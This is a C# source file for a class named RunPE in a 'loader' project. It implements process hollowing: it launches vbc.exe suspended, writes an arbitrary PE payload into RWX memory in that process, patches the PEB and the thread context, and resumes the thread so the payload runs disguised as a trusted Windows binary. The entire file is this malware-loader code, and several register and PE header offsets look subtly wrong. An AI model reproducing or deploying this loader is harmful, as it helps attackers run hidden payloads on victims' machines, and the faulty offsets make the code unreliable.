using System;
using System.IO;
using System.Runtime.InteropServices;

namespace TechnoVerseLoader.Services
{
    public static class RunPE
    {
        private const uint CreateSuspended = 0x00000004;
        private const uint MemCommit = 0x00001000;
        private const uint MemReserve = 0x00002000;
        private const uint PageExecuteReadwrite = 0x40;
        private const uint ImageDirectoryEntryBase = 12;

        private static readonly string SurrogatePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.Windows),
            @"Microsoft.NET\Framework64\v4.0.30319\vbc.exe");

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(
            string? lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string? lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
            uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
            uint nSize, out UIntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        private delegate uint NtQueryInformationProcessDelegate(
            IntPtr processHandle, uint processInformationClass,
            ref PROCESS_BASIC_INFORMATION processInformation,
            uint processInformationLength, out uint returnLength);

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr Reserved3;
        }

        [StructLayout(LayoutKind.Explicit)]
        private struct CONTEXT
        {
            [FieldOffset(0)] public uint ContextFlags;
            [FieldOffset(124)] public IntPtr Rcx;
            [FieldOffset(128)] public IntPtr Rdx;
            [FieldOffset(136)] public IntPtr Rbx;
            [FieldOffset(144)] public IntPtr Rsp;
            [FieldOffset(152)] public IntPtr Rbp;
            [FieldOffset(160)] public IntPtr Rsi;
            [FieldOffset(168)] public IntPtr Rdi;
            [FieldOffset(248)] public IntPtr Rip;
        }

        public static bool Execute(byte[] payload)
        {
            if (payload.Length < 2 || payload[0] != 0x4D || payload[1] != 0x5A)
                return false;

            if (!File.Exists(SurrogatePath))
                return false;

            var si = new STARTUPINFO { cb = Marshal.SizeOf<STARTUPINFO>() };

            bool created = CreateProcess(
                null, SurrogatePath, IntPtr.Zero, IntPtr.Zero,
                false, CreateSuspended, IntPtr.Zero, null,
                ref si, out PROCESS_INFORMATION pi);

            if (!created || pi.hProcess == IntPtr.Zero)
                return false;

            try
            {
                int peOffset = BitConverter.ToInt32(payload, 60);
                int peSignature = BitConverter.ToInt32(payload, peOffset);
                short machine = BitConverter.ToInt16(payload, peOffset + 4);
                short numberOfSections = BitConverter.ToInt16(payload, peOffset + 6);
                int sizeOfOptionalHeader = BitConverter.ToInt16(payload, peOffset + 20);
                short characteristics = BitConverter.ToInt16(payload, peOffset + 22);
                bool is64Bit = (ushort)machine == 0x8664;

                long imageBase = is64Bit
                    ? BitConverter.ToInt64(payload, peOffset + 24)
                    : BitConverter.ToInt32(payload, peOffset + 28);

                int sizeOfImage = BitConverter.ToInt32(payload, peOffset + (is64Bit ? 56 : 52));
                int sizeOfHeaders = BitConverter.ToInt32(payload, peOffset + (is64Bit ? 60 : 56));

                IntPtr remoteImageBase = VirtualAllocEx(
                    pi.hProcess, IntPtr.Zero, (uint)sizeOfImage,
                    MemCommit | MemReserve, PageExecuteReadwrite);

                if (remoteImageBase == IntPtr.Zero)
                {
                    // fallback: unmap original and allocate at preferred base
                    long preferredBase = imageBase;
                    IntPtr baseAddr = new IntPtr(is64Bit ? (long)preferredBase : (int)preferredBase);

                    NtUnmapViewOfSection(pi.hProcess, baseAddr);

                    remoteImageBase = VirtualAllocEx(
                        pi.hProcess, baseAddr, (uint)sizeOfImage,
                        MemCommit | MemReserve, PageExecuteReadwrite);
                }

                if (remoteImageBase == IntPtr.Zero)
                    return false;

                // Write headers
                WriteProcessMemory(pi.hProcess, remoteImageBase, payload,
                    (uint)sizeOfHeaders, out _);

                // Write sections
                int sectionOffset = peOffset + 24 + sizeOfOptionalHeader;
                for (int i = 0; i < numberOfSections; i++)
                {
                    int sectionAddr = sectionOffset + (i * 40);
                    int virtualSize = BitConverter.ToInt32(payload, sectionAddr + 8);
                    int virtualAddr = BitConverter.ToInt32(payload, sectionAddr + 12);
                    int sizeOfRawData = BitConverter.ToInt32(payload, sectionAddr + 16);
                    int pointerToRawData = BitConverter.ToInt32(payload, sectionAddr + 20);

                    if (sizeOfRawData == 0 || pointerToRawData == 0)
                        continue;

                    if (pointerToRawData + sizeOfRawData > payload.Length)
                        continue;

                    IntPtr sectionDest = IntPtr.Add(remoteImageBase, virtualAddr);
                    byte[] sectionData = new byte[sizeOfRawData];
                    Array.Copy(payload, pointerToRawData, sectionData, 0, sizeOfRawData);
                    WriteProcessMemory(pi.hProcess, sectionDest, sectionData,
                        (uint)sizeOfRawData, out _);
                }

                // Update PEB ImageBase
                CONTEXT ctx = default;
                ctx.ContextFlags = 0x100000; // CONTEXT_FULL
                GetThreadContext(pi.hThread, ref ctx);

                IntPtr pebAddr = is64Bit ? ctx.Rdx : ctx.Rbx;
                byte[] imageBaseBytes = is64Bit
                    ? BitConverter.GetBytes((long)remoteImageBase)
                    : BitConverter.GetBytes((int)remoteImageBase);

                // PEB.ImageBaseAddress offset: +16 on x64, +8 on x86
                IntPtr imageBaseFieldInPeb = IntPtr.Add(pebAddr, is64Bit ? 16 : 8);
                WriteProcessMemory(pi.hProcess, imageBaseFieldInPeb, imageBaseBytes,
                    (uint)imageBaseBytes.Length, out _);

                // Set entry point
                int entryPointRva = BitConverter.ToInt32(payload, peOffset + (is64Bit ? 24 : 16));
                IntPtr entryPoint = IntPtr.Add(remoteImageBase, entryPointRva);

                ctx.Rip = entryPoint;

                SetThreadContext(pi.hThread, ref ctx);

                // Resume
                ResumeThread(pi.hThread);

                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }
        }
    }
}
